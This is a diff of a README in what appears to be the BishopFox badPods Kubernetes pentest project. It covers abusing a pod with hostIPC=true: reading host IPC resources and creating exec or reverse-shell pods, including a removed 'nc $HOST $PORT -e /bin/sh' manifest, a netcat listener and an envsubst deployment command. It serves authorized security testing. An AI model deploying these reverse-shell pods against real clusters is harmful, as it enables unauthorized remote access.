@@ -1,77 +1,33 @@
-## You can create a pod with only hostIPC
+# Bad Pod #7: hostIPC
 
-If you only have `hostIPC=true`, you most likely can't do much. What you should do is use the `ipcs` command inside your hostIPC container to see if there are any ipc resources (shared memory segments, message queues, or semaphores). If you find one, you will likely need to create a program that can read them. 
-
+If you only have `hostIPC=true`, you most likely can't do much. If any process on the host or any processes within a pod is using the host’s inter-process communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware.
+* **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. 
 # Pod Creation
-
 ## Create a pod you can exec into
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-hostipc
-  labels:
-    app: pentest
-spec:
-  hostIPC: true
-  containers:
-  - image: ubuntu
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "while true; do sleep 30; done;" ]
-    name: hostipc
-  #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name
-```
-[hostipc-exec.yaml](hostipc-exec.yaml)
-
-#### Option 1: Create pod from local yaml 
+Create pod
 ```bash
-kubectl apply -f hostipc-exec.yaml   
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml 
 ```
-
-#### Option 2: Create pod from github hosted yaml
+Exec into pod 
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostipc/hostipc-exec.yaml  
+kubectl exec -it hostipc-exec-pod -- bash
 ```
 
-### Exec into pod 
-```bash
-kubectl -n [namespace] exec -it pod-hostipc -- bash
-```
+## Reverse shell pod
 
-## Or, create a reverse shell pod
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pod-hostipc-revshell
-  labels:
-    app: pentest
-spec:
-  hostIPC: true
-  containers:
-  - image: busybox
-    command: [ "/bin/sh", "-c", "--" ]
-    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-    name: hostipc--revshell    
-  restartPolicy: Always
-  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
-```
-[hostipc-revshell.yaml](hostipc-revshell.yaml)
-
-#### Set up listener
+Set up listener
 ```bash
 nc -nvlp 3116
 ```
 
-#### Create the pod
+Create pod from local manifest without modifying it by using env variables and envsubst
 ```bash
-# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
-HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/hostipc/hostipc-revshell.yaml | kubectl apply -f -
+HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/everything-allowed/pod/hostipc/pod/hostipc-revshell-pod.yaml | kubectl apply -f -
 ```
 
-#### Catch the shell and chroot to /host 
+Catch the shell
 ```bash
-~ nc -nvlp 3116
+$ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
 ```
